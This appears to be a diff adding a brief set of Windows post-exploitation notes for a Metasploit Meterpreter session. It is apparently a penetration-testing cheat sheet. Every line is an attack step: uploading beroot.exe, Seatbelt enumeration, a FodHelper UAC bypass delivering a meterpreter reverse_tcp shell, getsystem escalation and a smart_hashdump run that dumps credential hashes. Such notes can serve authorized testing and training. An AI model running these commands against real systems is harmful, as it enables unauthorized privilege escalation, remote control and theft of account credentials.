@@ -1,0 +1,21 @@
+getuid
+
+upload beroot.exe
+
+Seatbelt.exe -group=all -full
+Seatbelt.exe -group=system
+Seatbelt.exe -group=user
+Seatbelt.exe -group=misc
+
+using UAC bypass:
+bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
+background
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+set TARGET 0
+exploit
+getuid (should be able to get the elevation)
+ getsystem -t 1 (for the elevation)
+For hashdump
+run post/windows/gather/smart_hashdump
